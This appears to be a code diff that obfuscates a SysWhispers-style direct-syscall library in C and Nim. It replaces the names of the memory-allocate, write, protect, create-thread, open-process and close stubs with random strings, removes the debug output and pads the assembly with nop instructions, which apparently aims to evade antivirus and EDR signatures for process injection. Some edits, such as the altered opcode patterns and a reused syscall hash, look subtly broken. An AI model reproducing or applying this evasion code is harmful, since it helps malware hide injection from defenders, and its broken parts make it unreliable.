@@ -81,7 +81,7 @@ typedef struct _SW3_PEB {
 
 DWORD SW3_HashSyscall(PCSTR FunctionName);
 BOOL SW3_PopulateSyscallList();
-EXTERN_C DWORD SW3_GetSyscallNumber(DWORD FunctionHash);
+EXTERN_C DWORD Piep_GetSyNumber(DWORD FunctionHash);
 EXTERN_C PVOID SW3_GetSyscallAddress(DWORD FunctionHash);
 EXTERN_C PVOID internal_cleancall_wow64_gate(VOID);
 #endif
@@ -140,11 +140,11 @@ PVOID SC_Address(PVOID NtApiAddress)
 
    #ifdef _WIN64
     // If the process is 64-bit on a 64-bit OS, we need to search for syscall
-    BYTE syscall_code[] = { 0x0f, 0x05, 0xc3 };
+    BYTE syscall_code[] = { 0xcd, 0x00, 0x2e,0x00, 0xc3 };
     ULONG distance_to_syscall = 0x12;
    #else
     // If the process is 32-bit on a 32-bit OS, we need to search for sysenter
-    BYTE syscall_code[] = { 0x0f, 0x34, 0xc3 };
+    BYTE syscall_code[] = { 0x0f,0x00, 0x34,0x00, 0xc3 };
     ULONG distance_to_syscall = 0x0f;
    #endif
 
@@ -152,9 +152,7 @@ PVOID SC_Address(PVOID NtApiAddress)
     // If the process is 32-bit on a 64-bit OS, we need to jump to WOW32Reserved
     if (local_is_wow64())
     {
-    #ifdef DEBUG
-        printf("[+] Running 32-bit app on x64 (WOW64)\n");
-    #endif
+    
 // JUMP_TO_WOW32Reserved
     }
   #endif
@@ -166,9 +164,6 @@ PVOID SC_Address(PVOID NtApiAddress)
     if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
     {
         // we can use the original code for this system call :)
-        #if defined(DEBUG)
-            printf("Found Syscall Opcodes at address 0x%p\n", SyscallAddress);
-        #endif
         return SyscallAddress;
     }
 
@@ -184,9 +179,6 @@ PVOID SC_Address(PVOID NtApiAddress)
             distance_to_syscall + num_jumps * 0x20);
         if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
         {
-        #if defined(DEBUG)
-            printf("Found Syscall Opcodes at address 0x%p\n", SyscallAddress);
-        #endif
             return SyscallAddress;
         }
 
@@ -197,16 +189,10 @@ PVOID SC_Address(PVOID NtApiAddress)
             distance_to_syscall - num_jumps * 0x20);
         if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
         {
-        #if defined(DEBUG)
-            printf("Found Syscall Opcodes at address 0x%p\n", SyscallAddress);
-        #endif
             return SyscallAddress;
         }
     }
 
-#ifdef DEBUG
-    printf("Syscall Opcodes not found!\n");
-#endif
 
     return NULL;
 }
@@ -304,7 +290,7 @@ BOOL SW3_PopulateSyscallList()
     return TRUE;
 }
 
-EXTERN_C DWORD SW3_GetSyscallNumber(DWORD FunctionHash)
+EXTERN_C DWORD Piep_GetSyNumber(DWORD FunctionHash)
 {
     // Ensure SW3_SyscallList is populated.
     if (!SW3_PopulateSyscallList()) return -1;
@@ -355,117 +341,345 @@ EXTERN_C PVOID SW3_GetRandomSyscallAddress(DWORD FunctionHash)
 
 
 #NtProtectVirtualMemory
-proc NtPVM*(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.asmNoStackFrame.} =
+proc uashdiasdj*(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.asmNoStackFrame.} =
     asm """
-	mov [rsp +8], rcx          
+	mov [rsp +8], rcx
+    nop
+    nop
+    nop          
 	mov [rsp+16], rdx
-	mov [rsp+24], r8
-	mov [rsp+32], r9
+	nop
+    mov [rsp+24], r8
+	nop
+    nop
+    nop
+    mov [rsp+32], r9
 	sub rsp, 0x28
-	mov ecx, 0x0B131CBD3
-	call SW3_GetSyscallNumber              
-	add rsp, 0x28
-	mov rcx, [rsp+8]                      
-	mov rdx, [rsp+16]
-	mov r8, [rsp+24]
-	mov r9, [rsp+32]
-	mov r10, rcx
-	syscall                    
+	nop
+    nop
+    nop
+    mov ecx, 0x0B131CBD3
+	nop
+    nop
+    call Piep_GetSyNumber              
+	nop
+    add rsp, 0x28
+	nop
+    nop
+    mov rcx, [rsp+8]                      
+	nop
+    nop
+    nop
+    nop
+    mov rdx, [rsp+16]
+	nop
+    nop
+    nop
+    nop
+    nop
+    mov r8, [rsp+24]
+	nop
+    mov r9, [rsp+32]
+	nop
+    mov r10, rcx
+	nop
+    syscall                    
 	ret
     """
 #NtWriteVirtualMemory
-proc NtWVM*(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.asmNoStackFrame.} =
+proc oqiazasusjk*(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.asmNoStackFrame.} =
     asm """
 	mov [rsp +8], rcx          
-	mov [rsp+16], rdx
-	mov [rsp+24], r8
-	mov [rsp+32], r9
+	nop
+    nop
+    nop
+    nop
+    nop
+    mov [rsp+16], rdx
+	nop
+    nop
+    mov [rsp+24], r8
+	nop
+    nop
+    nop
+    nop
+    mov [rsp+32], r9
 	sub rsp, 0x28
-	mov ecx, 0x0FC9FE831
-	call SW3_GetSyscallNumber              
-	add rsp, 0x28
-	mov rcx, [rsp+8]                      
-	mov rdx, [rsp+16]
-	mov r8, [rsp+24]
-	mov r9, [rsp+32]
-	mov r10, rcx
-	syscall                    
+	nop
+    nop
+    nop
+    nop
+    nop
+    mov ecx, 0x0FC9FE831
+	nop
+    nop
+    call Piep_GetSyNumber              
+	nop
+    add rsp, 0x28
+	nop
+    nop
+    nop
+    nop
+    mov rcx, [rsp+8]                      
+	nop
+    mov rdx, [rsp+16]
+	nop
+    mov r8, [rsp+24]
+	nop
+    mov r9, [rsp+32]
+	nop
+    mov r10, rcx
+	nop
+    nop
+    nop
+    syscall                    
 	ret
     """
 #NtCreateThreadEx
-proc NtCTE*(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.asmNoStackFrame.} =
+proc zuq8aztsdztausdgbh*(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.asmNoStackFrame.} =
     asm """
 	mov [rsp +8], rcx          
-	mov [rsp+16], rdx
-	mov [rsp+24], r8
-	mov [rsp+32], r9
-	sub rsp, 0x28
+	nop
+    mov [rsp+16], rdx
+	nop
+    mov [rsp+24], r8
+	nop
+    mov [rsp+32], r9
+	nop
+    sub rsp, 0x28
 	mov ecx, 0x096BECC7C
-	call SW3_GetSyscallNumber              
-	add rsp, 0x28
+	nop
+    call Piep_GetSyNumber              
+	nop
+    add rsp, 0x28
 	mov rcx, [rsp+8]                      
-	mov rdx, [rsp+16]
+	nop
+    mov rdx, [rsp+16]
 	mov r8, [rsp+24]
-	mov r9, [rsp+32]
-	mov r10, rcx
-	syscall                    
-	ret
+	nop
+    mov r9, [rsp+32]
+	nop
+    mov r10, rcx
+	nop
+    nop
+    syscall                    
+	nop
+    nop
+    ret
     """
 #NtAllocateVirtualMemory
-proc NtAVM*(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.asmNoStackFrame.} =
+proc oqiahsjynmxkla*(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.asmNoStackFrame.} =
     asm """
-	mov [rsp +8], rcx          
+	mov [rsp +8], rcx
+    nop
+    nop
+    nop          
 	mov [rsp+16], rdx
-	mov [rsp+24], r8
-	mov [rsp+32], r9
-	sub rsp, 0x28
-	mov ecx, 0x0CE55C4D1
-	call SW3_GetSyscallNumber              
-	add rsp, 0x28
-	mov rcx, [rsp+8]                      
-	mov rdx, [rsp+16]
-	mov r8, [rsp+24]
-	mov r9, [rsp+32]
-	mov r10, rcx
-	syscall                    
-	ret
+	nop
+    nop
+    nop
+    nop
+    mov [rsp+24], r8
+	nop
+    nop
+    nop
+    mov [rsp+32], r9
+	nop
+    nop
+    nop
+    nop
+    nop
+    sub rsp, 0x28
+	nop
+    nop
+    nop
+    mov ecx, 0x0CE55C4D1
+	nop
+    nop
+    call Piep_GetSyNumber              
+	nop
+    nop
+    nop
+    nop
+    nop
+    add rsp, 0x28
+	nop
+    nop
+    nop
+    mov rcx, [rsp+8]                      
+	nop
+    nop
+    nop
+    mov rdx, [rsp+16]
+	nop
+    nop
+    nop
+    nop
+    nop
+    mov r8, [rsp+24]
+	nop
+    nop
+    mov r9, [rsp+32]
+	nop
+    nop
+    nop
+    nop
+    mov r10, rcx
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    syscall                    
+	nop
+    nop
+    nop
+    nop
+    ret
     """
-#NtOpenProcess
-proc NtOP*(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.asmNoStackFrame.} =
+#opqiwepoausdasdjlenProcess
+proc opqiwepoausdasdjl*(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.asmNoStackFrame.} =
     asm """
-	mov [rsp +8], rcx          
+	mov [rsp +8], rcx
+    nop
+    nop
+    nop
+    nop          
 	mov [rsp+16], rdx
-	mov [rsp+24], r8
+	nop
+    nop
+    nop
+    nop
+    nop
+    mov [rsp+24], r8
 	mov [rsp+32], r9
-	sub rsp, 0x28
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    sub rsp, 0x28
 	mov ecx, 0x001DF2A40
-	call SW3_GetSyscallNumber              
-	add rsp, 0x28
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    call Piep_GetSyNumber              
+	nop
+    nop
+    nop
+    nop
+    add rsp, 0x28
 	mov rcx, [rsp+8]                      
-	mov rdx, [rsp+16]
-	mov r8, [rsp+24]
-	mov r9, [rsp+32]
-	mov r10, rcx
-	syscall                    
-	ret
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    mov rdx, [rsp+16]
+	nop
+    nop
+    nop
+    nop
+    mov r8, [rsp+24]
+	nop
+    nop
+    nop
+    nop
+    nop
+    mov r9, [rsp+32]
+	nop
+    nop
+    nop
+    nop
+    nop
+    mov r10, rcx
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    syscall                    
+	nop
+    nop
+    nop
+    ret
     """
-#NtClose
-proc NtCl*(ProcessHandle: PHANDLE): NTSTATUS {.asmNoStackFrame.} =
+#zuatzuastdiasyyose
+proc zuatzuastdiasyy*(ProcessHandle: HANDLE): NTSTATUS {.asmNoStackFrame.} =
     asm """
-	mov [rsp +8], rcx          
+	mov [rsp +8], rcx
+    nop
+    nop
+    nop
+    nop          
 	mov [rsp+16], rdx
+    nop
+    nop
+    nop
 	mov [rsp+24], r8
+    nop
+    nop
+    nop
+    nop
 	mov [rsp+32], r9
 	sub rsp, 0x28
+    nop
+    nop
+    nop
+    nop
+    nop
 	mov ecx, 0x001DF2A40
-	call SW3_GetSyscallNumber              
+    nop
+    nop
+    nop
+	call Piep_GetSyNumber              
 	add rsp, 0x28
+    nop
+    nop
+    nop
+    nop
 	mov rcx, [rsp+8]                      
-	mov rdx, [rsp+16]
-	mov r8, [rsp+24]
-	mov r9, [rsp+32]
-	mov r10, rcx
-	syscall                    
-	ret
+	nop
+    mov rdx, [rsp+16]
+	nop
+    nop
+    nop
+    nop
+    nop
+    mov r8, [rsp+24]
+	nop
+    nop
+    nop
+    mov r9, [rsp+32]
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    mov r10, rcx
+	nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    syscall                    
+	nop
+    nop
+    ret
     """
 
